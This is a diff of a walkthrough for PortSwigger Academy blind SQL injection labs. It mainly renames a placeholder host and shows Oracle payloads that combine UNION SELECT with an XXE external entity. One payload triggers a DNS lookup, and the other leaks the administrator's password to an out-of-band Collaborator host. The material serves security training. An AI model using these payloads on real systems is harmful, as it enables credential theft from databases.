@@ -588,7 +588,7 @@ Burp Suite Professional is required to solve this lab!
 2. Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
 
 ```text
-TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//burp-collab-subdomain/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
     
 3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.
@@ -597,7 +597,7 @@ The solution described here is sufficient simply to trigger a DNS lookup and so 
 
 ### Exploitability
 
-To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server. To solve the lab, it is required to exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) is only available in the Enterprise and Professional editions. You can apply for a free 30-day trial [here](https://portswigger.net/requestfreetrial/pro). 
+To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server. To solve the lab, it is required to exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) is only available in the Enterprise and Professional editions. You can apply for a free 30-day trial [here](https://portswigger.net/requestfreetrial/pro). 
 
 ----
 
@@ -617,7 +617,7 @@ The database contains a different table called users, with columns called userna
 2. Modify the `TrackingId` cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
 
 ```text
-TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.burp-collab-subdomain/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
     
 3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.
